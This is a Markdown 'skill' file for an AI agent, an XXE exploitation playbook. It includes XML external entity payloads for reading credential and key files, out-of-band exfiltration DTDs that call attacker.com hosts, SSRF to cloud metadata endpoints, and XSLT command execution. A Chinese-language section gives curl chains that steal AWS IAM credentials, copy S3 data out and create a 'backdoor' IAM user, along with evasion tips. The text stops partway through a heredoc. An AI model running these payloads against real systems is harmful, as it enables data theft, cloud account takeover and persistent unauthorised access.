---
name: xxe-xml-external-entity
description: >-
  XXE playbook. Use when XML, SVG, OOXML, SOAP, or parser-driven imports may resolve external entities, files, or internal network resources.
---

# SKILL: XML External Entity Injection (XXE) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert XXE techniques. Covers all injection contexts (SOAP, REST JSON→XML parsers, Office files, SVG), OOB exfiltration (critical when direct read fails), blind XXE detection, and XXE-to-SSRF chain. Base models often miss OOB and non-XML context XXE. For real-world CVE chains, Office docx XXE step-by-step, PHP expect:// RCE, and Solr XXE+RCE, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

Also load:

- [file-access-vuln](../file-access-vuln/SKILL.md) when XXE is reachable through SVG, OOXML, import, or preview pipelines

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Apache Solr XXE + RCE chain (CVE-2017-12629) — XXE to read config, then VelocityResponseWriter for RCE
- Office docx XXE step-by-step — unzip → inject DOCTYPE into `word/document.xml` or `[Content_Types].xml` → repackage → upload
- DOCTYPE-based blind SSRF — `PUBLIC` external DTD reference triggers HTTP callback without entity reflection
- PHP `expect://` protocol via XXE — direct command execution when expect extension is installed
- Blind XXE via error messages — force file path error that leaks content in exception text
- XXE in SOAP web services — inject entities into SOAP Envelope/Body elements

---

## 1. CLASSIC XXE PAYLOAD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

If `/etc/passwd` reflects in response → confirmed file read.

---

## 2. ATTACK SURFACE DISCOVERY

### Direct XML Inputs
- SOAP endpoints (`text/xml`, `application/soap+xml`)
- REST APIs accepting `application/xml`
- File upload: `.xlsx`, `.docx`, `.pptx` (Office Open XML)
- SVG uploads (SVG is XML)
- RSS/Atom feed parsers
- Web services with XML config import

### Non-Obvious XML Processing
Change `Content-Type` header on **any** JSON POST to:
```
Content-Type: application/xml
```
Then rewrite body as XML — many backends use dual-format parsers or auto-detect.

### PDF Generators
Some HTML→PDF tools (wkhtmltopdf, PrinceXML) execute SSRF via embedded URLs but also parse external entities in SVG/XML included in the HTML.

---

## 3. OOB (OUT-OF-BAND) XXE — CRITICAL

Use when direct entity reflection fails (server parses but doesn't echo entity content):

### Step 1: Blind detection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```
DNS/HTTP hit to collaborator → confirms XXE (even if no file content returned).

### Step 2: OOB file exfiltration via attacker-hosted DTD
**Attacker's server hosts a malicious DTD** at `http://test-attacker.com/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://test-attacker.com/?data=%file;'>">
%exfil;
```

**Payload sent to target**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://test-attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```
File contents appear in attacker's HTTP server request log.

### Step 3: Error-based OOB (alternative when HTTP blocked)
Use intentional error to leak data in error message:
```xml
<!-- test-attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---

## 4. XXE FILE READ TARGETS

**Linux**:
```
/etc/passwd
/etc/shadow  (requires root)
/etc/hosts
/proc/self/environ      ← environment variables (DB creds, API keys)
/proc/self/cmdline      ← process command line
/var/log/apache2/access.log  ← may contain passwords in URLs
/home/USER/.ssh/id_rsa  ← SSH private key
/home/USER/.aws/credentials ← AWS keys
/home/USER/.bash_history
```

**Windows**:
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    ← ASP.NET connection strings
C:\xampp\htdocs\wp-config.php    ← WordPress DB credentials
C:\Users\Administrator\.ssh\id_rsa
```

---

## 5. SVG XXE (file upload context)

When SVG uploads are accepted and served/processed:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```
Upload as `.svg` → `GET /uploads/file.svg` → file contents in response.

---

## 6. OFFICE FILE XXE (docx/xlsx/pptx)

Office files are ZIP archives containing XML. Inject into `[Content_Types].xml` or `word/document.xml`:

```bash
# Step 1: extract
unzip original.docx -d extracted/

# Step 2: edit word/document.xml — add malicious DTD
# Add after <?xml version="1.0" encoding="UTF-8" standalone="yes"?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then use &xxe; inside document text

# Step 3: repackage
cd extracted && zip -r ../malicious.docx .
```

---

## 7. SOAP ENDPOINT XXE

SOAP requests parse XML by definition. Inject external entity into SOAP envelope:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## 8. XXE → SSRF CHAIN

XXE external entity can point to internal HTTP endpoints (identical to SSRF):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```
This combines XXE file read + SSRF into a single payload.

---

## 9. XInclude ATTACK

When server-side processes XInclude (import XML from another source), but you can't control the DOCTYPE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

Works in: Apache Cocoon, Xerces-J, libxml2 with XInclude support enabled.

---

## 10. PROTOCOL HANDLERS IN XXE

```xml
<!-- HTTP (SSRF) -->
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">

<!-- File read -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP wrapper (if PHP with libxml2) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- Decode base64 in response to get file contents -->

<!-- FTP (exfil / port scan) -->
<!ENTITY xxe SYSTEM "ftp://test-attacker.com:21/x">

<!-- Gopher (Redis, SMTP) -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">
```

---

## 11. BYPASSING DEFENSES

### Parser blocks DOCTYPE
Try XInclude (no DOCTYPE needed, see §9).

### Only allows specific XML schemas
If schema validation occurs: inject comments or CDATA after schema validation but before entity processing.

### Response encoding issues (binary in response)
Use PHP filter for base64:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Network restrictions on OOB
Use DNS-only OOB via `SYSTEM "file://HASH.test-attacker.com"` — no HTTP required, DNS lookup leaks data.

---

## 12. QUICK DETECTION CHECKLIST

```
□ Find XML input point (or JSON→XML transformation)
□ Send basic entity: <!ENTITY xxe "test"> → &xxe; in body → does "test" reflect?
□ If yes → file read: SYSTEM "file:///etc/passwd"
□ If no reflection → OOB test via Collaborator URL
□ If OOB hit → set up attacker DTD for file exfiltration
□ Try SVG upload with XXE
□ Try Content-Type: application/xml on JSON endpoints
□ Try XInclude if DOCTYPE-based fails
```

---

## 13. LOCAL DTD INJECTION (BLIND XXE AMPLIFICATION)

When external entities are blocked but local DTD files exist on the server:

### Technique

```xml
<!-- Override an entity defined in a LOCAL DTD file -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### Common Local DTD Paths

#### Linux

```
/usr/share/yelp/dtd/docbookx.dtd           # GNOME Help
/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig
/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
/usr/share/struts/struts-config_1_0.dtd     # Apache Struts
/usr/share/nmap/nmap.dtd                    # Nmap
/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP
```

#### Windows

```
C:\Windows\System32\wbem\xml\cim20.dtd            # WMI
C:\Windows\System32\wbem\xml\wmi20.dtd             # WMI
C:\Program Files\IBM\WebSphere\*.dtd               # WebSphere
C:\Program Files (x86)\Lotus\*.dtd                 # Lotus Notes
```

#### Inside JAR Files (Java Applications)

```
jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
```

### Why This Works

- External connections blocked (firewall/WAF/egress filter)
- But file:// to LOCAL files is usually allowed
- Local DTD is trusted → entity overrides inject attacker-controlled definitions
- Error messages or blind extraction via file:// still works

---

## 14. ADDITIONAL OOB EXFILTRATION CHANNELS

### FTP-based exfiltration (line-by-line)

FTP protocol sends data line-by-line, making it useful for multi-line file exfiltration when HTTP-based OOB truncates at newlines:

```xml
<!-- test-attacker.com/ftp-exfil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://test-attacker.com:2121/%file;'>">
%exfil;
%send;
```

Run a rogue FTP server (e.g., `xxeserv` or custom Python) on port 2121 — each line of the file arrives as a separate `RETR` or `CWD` command.

### HTTP parameter exfiltration

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://test-attacker.com/?d=%file;'>">
%exfil;
%send;
```

Base64 encoding avoids newline/special-character issues in HTTP URL. Decode the `d=` parameter on attacker server.

---

## 15. DTD NESTING TRICKS — PARAMETER ENTITY CHAINING

### Parameter entity within parameter entity

Used to bypass parsers that block direct entity references in entity values:

```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x25; b;">
  <!ENTITY % b SYSTEM "http://test-attacker.com/chain.dtd">
  %a;
]>
```

The parser expands `%a;` → `%b;` → fetches external DTD. Some WAFs only inspect the first level of entity definitions.

### Triple-nested for filter evasion

```xml
<!-- test-attacker.com/stage1.dtd -->
<!ENTITY % s2 SYSTEM "http://test-attacker.com/stage2.dtd">
%s2;

<!-- test-attacker.com/stage2.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % s3 "<!ENTITY &#x25; exfil SYSTEM 'http://test-attacker.com/?d=%file;'>">
%s3;
%exfil;
```

Payload sent to target only references `stage1.dtd` — the actual file read happens two DTD fetches deep, evading shallow WAF inspection.

---

## 16. XXE IN NON-OBVIOUS FORMATS

| Format | XML Location | Injection Point |
|--------|-------------|-----------------|
| **SOAP Envelope** | Entire body is XML | Add DOCTYPE before `<soap:Envelope>` |
| **SVG Image** | SVG is XML | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in SVG header |
| **OOXML (.docx)** | `word/document.xml`, `[Content_Types].xml` | Inject DOCTYPE + entity into any XML member |
| **OOXML (.xlsx)** | `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml` | Entity reference in cell values |
| **RSS/Atom feeds** | Feed body is XML | Inject into feed items if user content is included |
| **SAML assertions** | SAML XML tokens | DOCTYPE injection in `SAMLResponse` parameter (base64-decoded XML) |
| **XMPP** | Protocol messages are XML stanzas | Entity in message body or JID fields |
| **GPX files** | GPS track data in XML | Via file upload endpoints accepting GPX |
| **XHTML** | Strict XHTML is valid XML | DOCTYPE injection in XHTML documents |

### SAML XXE

```xml
<!-- Base64-decode the SAMLResponse, inject DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Re-encode to base64, submit as `SAMLResponse` parameter.

---

## 17. XXE VIA FILE UPLOAD

### SVG upload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

Upload as avatar/image → view uploaded SVG → file content rendered as text.

### XLSX (Excel) upload

```bash
# 1. Create minimal .xlsx, unzip it
unzip report.xlsx -d xlsx_tmp/

# 2. Inject into xl/sharedStrings.xml
# Add after XML declaration:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Replace a <t> element content with &xxe;

# 3. Repackage
cd xlsx_tmp && zip -r ../malicious.xlsx .
```

Alternatively inject into `[Content_Types].xml` (parsed first by most OOXML processors).

### DOCX upload

```bash
# Target: word/document.xml
# Same approach: unzip → inject DOCTYPE + entity → repackage

# Alternative: inject into customXml/item1.xml if custom XML parts exist
```

### Processing pipeline attack

Even if the uploaded file is not directly rendered, the server-side parser (Apache POI, python-docx, OpenXML SDK) may process entities during import, triggering OOB exfiltration.

---

## 18. ERROR-BASED XXE

Force the XML parser to generate an error message containing file content:

### Method 1: Non-existent file reference

```xml
<!-- test-attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser attempts to open `file:///nonexistent/<hostname_content>` → error message includes the hostname value.

### Method 2: XML schema validation error

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>">
  %eval;
  %err;
]>
```

The `jar:` protocol handler generates verbose error messages that include the expanded entity value.

### Method 3: Integer overflow / type error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'file:///%file;'>">
%int;
%trick;
```

Parser tries to open a file path containing the target file content → error message reveals content.

---

## 19. XSLT INJECTION CONNECTION TO XXE

XSLT processors parse XML and can be chained with XXE:

### XSLT file read

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XSLT RCE (processor-dependent)

```xml
<!-- Xalan-J (Java) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP (libxslt with registerPHPFunctions) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XXE → XSLT chain

If the target accepts XML input with a stylesheet reference (`<?xml-stylesheet?>`), inject both an external entity and a malicious XSLT to escalate from file read to RCE.

---

## 20. 2026 EMERGING TECHNIQUES

### 20.1 XXE in Cloud / Serverless Environments

Modern serverless and edge-compute platforms introduce new XXE attack surfaces where egress filtering is often inconsistent.

#### AWS Lambda — Layered File Read

Lambda functions package code as ZIP layers. XXE can read the function's own source and configuration:

```xml
<!ENTITY xxe SYSTEM "file:///var/task/index.js">
<!-- Lambda handler source code -->
<!ENTITY xxe SYSTEM "file:///opt/extension.js">
<!-- Lambda extension layer -->
<!ENTITY xxe SYSTEM "file:///var/runtime/bootstrap">
<!-- Lambda runtime bootstrap -->
```

**Chain to credential theft**: Lambda environment variables (including `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`) are accessible via:

```xml
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
```

**Lambda container image XXE**: when using `aws-lambda-container` base images, the entire `/var/task` and `/var/lang` trees are readable, exposing compiled `.pyc` files and dependency manifests.

#### GCP Cloud Run — Metadata + Source Read

```xml
<!-- GCP Cloud Run metadata service -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
<!-- Note: requires Metadata-Flavor: Google header, but some XML parsers forward headers -->
```

#### Azure Functions — App Settings Leak

```xml
<!ENTITY xxe SYSTEM "file:///home/site/wwwroot/host.json">
<!ENTITY xxe SYSTEM "file:///home/site/wwwroot/local.settings.json">
<!-- Contains AzureWebJobsStorage connection strings, Service Bus keys, etc. -->
```

### 20.2 XXE in Modern Framework Parsers (2025-2026)

#### .NET 8/9 — XML Parser Hardening & Bypasses

.NET 8+ sets `XmlReaderSettings.DtdProcessing = Prohibit` by default, but many legacy code paths and WCF bindings still use `DtdProcessing.Parse`:

```csharp
// Vulnerable: WCF REST service with WebHttpBinding
// web.config may enable DTD processing for backward compatibility
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Parse;  // ← still found in legacy WCF
```

**Bypass via XInclude**: when `DtdProcessing = Prohibit` blocks DOCTYPE, XInclude may still work if the parser supports it:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///c:/inetpub/wwwroot/web.config"/>
</root>
```

#### Go encoding/xml — No DTD Processing (but new attack surface)

Go's `encoding/xml` package does **not** process external entities by default, making classic XXE rare in Go backends. However:

- Go services using `libxml2` bindings (via cgo) **are** vulnerable
- SOAP services built with `gowsdl` may use `libxml2` for XML processing
- `encoding/xml`'s `xml.NewDecoder` has a [2025 discovery](https://github.com/golang/go/issues) where malformed XML can cause **memory exhaustion** via deeply nested entity expansion (billion laughs variant)

#### Spring Boot 3.x — Jackson XML & JAXB

Spring Boot 3 uses Jackson XML (`jackson-dataformat-xml`) which delegates to Woodstox StAX parser. While Woodstox disables external DTD by default, the `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES` property can be re-enabled via misconfiguration:

```yaml
# application.yml — vulnerable misconfiguration
spring:
  jackson:
    xml:
      enable-external-entities: true  # ← should never be true
```

### 20.3 XXE via AI/LLM Pipelines

AI/LLM infrastructure processes XML in several non-obvious contexts, creating new XXE attack surfaces:

#### RAG Pipeline Document Ingestion

Many RAG systems ingest `.docx`, `.pdf`, and `.svg` files. The document parser pipeline often includes XML processing:

```python
# Vulnerable RAG document loader
from langchain_community.document_loaders import UnstructuredFileLoader
# Unstructured may call lxml/etree which may process entities
# if the underlying parser has DTD processing enabled
```

**Attack vector**: upload a malicious `.docx` with embedded XXE in `word/document.xml` to a RAG ingestion endpoint → the document parser processes entities → file read or SSRF.

#### SOAP-based LLM APIs

Some enterprise LLM deployments expose SOAP gateways for backward compatibility:

```xml
<!-- Target: enterprise LLM SOAP API -->
POST /llm-service/soap
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GenerateText>
      <prompt>&xxe;</prompt>
    </GenerateText>
  </soap:Body>
</soap:Envelope>
```

#### SVG Upload → AI Image Analysis

AI image analysis services that accept SVG uploads for vision model processing are vulnerable:

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>
```

The AI vision pipeline parses the SVG, resolves the external entity, and the SSRF response may appear in error logs or be exfiltrated via OOB.

### 20.4 Blind XXE Enhancements for HTTP/2/3

HTTP/2 and HTTP/3 environments complicate OOB exfiltration because the protocols multiplex differently:

#### HTTP/2 — Connection Coalescing + XXE OOB

```xml
<!-- HTTP/2 coalescing can cause OOB requests to go to unexpected backends -->
<!ENTITY % dtd SYSTEM "https://attacker.com/evil.dtd">
%dtd;
```

If the target uses HTTP/2 connection coalescing (same IP, different hostnames), the OOB DTD fetch may route through a coalesced connection, bypassing per-host egress filters.

#### HTTP/3 (QUIC) — UDP Egress

HTTP/3 uses UDP. Many firewalls allow TCP 443 but block UDP 443. Test both:

```xml
<!-- HTTP/3 OOB may fail if UDP egress is blocked -->
<!ENTITY % dtd SYSTEM "https://attacker.com/evil.dtd">

<!-- Fallback: DNS-only exfil (works on any protocol) -->
<!ENTITY % dtd SYSTEM "file:///nonexistent">
<!-- Force DNS resolution of attacker-controlled hostname via error message -->
```

### 20.5 XXE + Cloud Metadata SSRF Chain (IMDSv2 Bypass)

AWS IMDSv2 requires a `PUT` request for token acquisition. Classic XXE-based SSRF (which only does GET) cannot bypass IMDSv2 directly. However:

**Axios CVE-2026-40175 header injection**: if the XXE target uses Axios for outbound HTTP requests, a header injection vulnerability can craft the required `PUT` request, enabling IMDSv2 bypass:

```xml
<!-- Chain: XXE → Axios SSRF → IMDSv2 bypass -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/api/put?X-aws-ec2-metadata-token-ttl-seconds:21600">
```

**Note**: thousands of EC2 instances still run IMDSv1 fallback mode, making direct GET-based XXE→IMDSv1 SSRF still viable in 2026.

### 20.6 XXE via SAML in Modern SSO (2026)

SAML SSO implementations remain a persistent XXE vector in 2026, especially in enterprise IdP-SP integrations:

```xml
<!-- SAML Response with XXE — base64-decode, inject, re-encode -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**2026 detection tip**: many SAML implementations now disable DTD processing by default, but **legacy Shibboleth SP** installations (still common in universities) often have `dtdValidate=true` in their XML parser configuration.

### 20.7 Billion Laughs Variants — 2026 Evasion

Modern WAFs detect the classic billion laughs entity expansion. New evasion patterns:

```xml
<!-- Variant: use XInclude instead of entity expansion -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///dev/urandom" parse="binary"/>
</root>
<!-- Reads /dev/urandom indefinitely → memory exhaustion without DTD -->

<!-- Variant: recursive XSLT include -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:include href="recursive-self-reference.xml"/>
</xsl:stylesheet>
```

### 20.8 2026 XXE Quick Reference Table

| Context | Payload Pattern | Impact | Note |
|---|---|---|---|
| Lambda | `file:///proc/self/environ` | AWS credentials | IMDSv1 only |
| GCP Cloud Run | `http://metadata.google.internal/...` | Service account token | Requires header forwarding |
| Azure Functions | `file:///home/site/wwwroot/local.settings.json` | Connection strings | Always readable |
| .NET 8/9 WCF | XInclude bypass when DTD prohibited | File read | Check `DtdProcessing` setting |
| AI RAG pipeline | `.docx` with XXE in `word/document.xml` | File read / SSRF | Through document parser |
| SAML SSO | DOCTYPE in `SAMLResponse` | File read | Legacy Shibboleth |
| HTTP/3 OOB | DNS-only exfil (UDP blocked) | Blind XXE detect | Use `file:///HASH.attacker.com` |
| IMDSv2 bypass | XXE → Axios CVE-2026-40175 | Cloud creds | IMDSv1 fallback still common |

### 20.9 2026 XXE Testing Checklist Supplement

```
□ Test Lambda/Azure Functions file paths: /var/task/, /home/site/wwwroot/
□ Try XInclude when DOCTYPE is blocked (.NET, Java)
□ Upload .docx/.svg to AI/RAG document ingestion endpoints
□ Test SOAP endpoints on LLM API gateways
□ Check if HTTP/3 (UDP) blocks OOB — use DNS-only fallback
□ Probe SAML SSO endpoints with DOCTYPE injection
□ Attempt billion laughs variant via XInclude (/dev/urandom)
□ Check for IMDSv1 fallback on cloud targets before IMDSv2 bypass attempts
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 5 条完整、可即用的实战攻击链，覆盖 2026 年真实场景。所有命令均以授权渗透测试为前提。

### 攻击链 1：XXE 至 SSRF 链（AWS 元数据 IMDSv1）

**场景**：目标运行在 AWS EC2 上，接受 XML 输入（SOAP API 或 Content-Type: application/xml），使用 IMDSv1（默认）。通过 XXE 触发 SSRF 访问实例元数据服务，窃取 IAM 临时凭证。

**CVE 参考**：SSRF via XXE（CWE-918 + CWE-611），AWS IMDSv1 设计缺陷在 2026 年仍影响大量未迁移实例。

**步骤 1：探测 XXE 注入点**

```bash
# 测试目标是否接受 XML 输入
# 方法 1: 修改 Content-Type 从 JSON 到 XML
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><data>test</data></root>'

# 若返回 200 而非 415 → 后端接受 XML

# 方法 2: 测试实体解析（确认 XXE）
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe "XXE_CONFIRMED">]>
<root><data>&xxe;</data></root>'

# 若响应包含 "XXE_CONFIRMED" → 经典 XXE 确认
```

**步骤 2：通过 XXE 读取本地文件确认利用**

```bash
# 读取 /etc/passwd 确认文件读取能力
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'

# 读取 AWS 元数据（IMDSv1 - GET 请求，无需 token）
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>'
# 返回可用元数据类别列表
```

**步骤 3：窃取 IAM 角色名称**

```bash
# 获取实例关联的 IAM 角色名
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>'
# 返回: MyEC2Role（角色名）
```

**步骤 4：窃取 IAM 临时凭证**

```bash
# 使用获取的角色名查询临时凭证
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role">]>
<root><data>&xxe;</data></root>'

# 返回 JSON 格式的临时凭证:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2026-07-24T12:00:00Z"
# }
```

**步骤 5：利用窃取的凭证访问 AWS 资源**

```bash
# 配置 AWS CLI 使用窃取的临时凭证
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# 列出 S3 存储桶
aws s3 ls

# 列出 EC2 实例
aws ec2 describe-instances --region us-east-1

# 下载 S3 中的敏感数据
aws s3 sync s3://target-company-backups /tmp/exfil/

# 若角色权限足够，可创建新 IAM 用户实现持久化
aws iam create-user --user-name backdoor
aws iam create-access-key --user-name backdoor
```

**步骤 6：IMDSv2 绕过尝试（若目标已迁移到 IMDSv2）**

```bash
# IMDSv2 需要 PUT 请求获取 token，经典 XXE 只能发 GET
# 但可利用 XXE + 服务端 SSRF 代理绕过

# 若目标应用内部有 SSRF 代理端点，链式利用:
# 1. XXE 触发应用内部 SSRF
# 2. SSRF 端点发送 PUT 请求获取 IMDSv2 token
# 3. 用 token 访问元数据

# Axios CVE-2026-40175 可用于构造 PUT 请求（见 20.5 章节）
```

**检测规避要点**：
- IMDSv1 只需 GET 请求，XXE 原生支持
- 169.254.169.254 是 link-local 地址，不走外网防火墙
- 临时凭证有效期通常 6 小时，需及时使用
- 利用 `php://filter/convert.base64-encode` 避免特殊字符破坏 XML

---

### 攻击链 2：Blind XXE + OOB 外带（外部 DTD）

**场景**：目标存在 XXE，但响应不回显实体内容（服务器解析 XML 但不返回数据）。需要通过 OOB（Out-of-Band）渠道外带数据。

**步骤 1：确认 Blind XXE（OOB 检测）**

```bash
# 启动 OOB 接收端
python3 -m http.server 8080  # 简单 HTTP 服务器
# 或使用 Burp Collaborator / Interactsh

# 发送触发外部 HTTP 请求的 XXE
curl -i -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com:8080/xxe_test">]>
<root><data>&xxe;</data></root>'

# 攻击者侧 HTTP 服务器收到请求 → Blind XXE 确认
# 日志: GET /xxe_test HTTP/1.1
```

**步骤 2：搭建攻击者 DTD 服务器**

```bash
# 攻击者侧创建恶意 DTD 文件
cat > /data/user/work/evil.dtd << 'EOF'
<!-- 读取目标文件并外带到攻击者服务器 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8080/?data=%file;'>">
